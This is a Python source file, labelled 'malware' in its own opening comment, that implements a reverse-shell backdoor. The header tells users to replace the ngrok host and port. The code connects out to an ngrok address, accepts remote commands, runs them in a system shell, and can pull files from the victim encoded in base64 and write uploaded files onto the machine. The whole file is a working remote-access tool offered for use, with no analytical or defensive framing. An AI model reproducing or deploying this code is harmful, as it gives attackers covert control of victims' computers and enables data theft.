#to use this malware is a bit complex, you have to
#scroll to the end of the code and replace backdoor("whatever to your ngrok link", "whatever to your ngrok port") and save

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))

    def real_send(self, data):
        json_info = json.dumps(data)
        self.connection.send(json_info)

    def real_recieve(self):
        json_info = ""
        while True:
            try:
                 json_info = json_info + self.connection.recv(1024)
                 return json.loads(json_info)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL )


    def change_directory(self, path):
        os.chdir(path)
        return "[+] changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        while True:
            command = self.real_recieve()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"

            self.real_send(command_result)

my_backdoor = Backdoor("5.tcp.eu.ngrok.io", 12556)
my_backdoor.run()

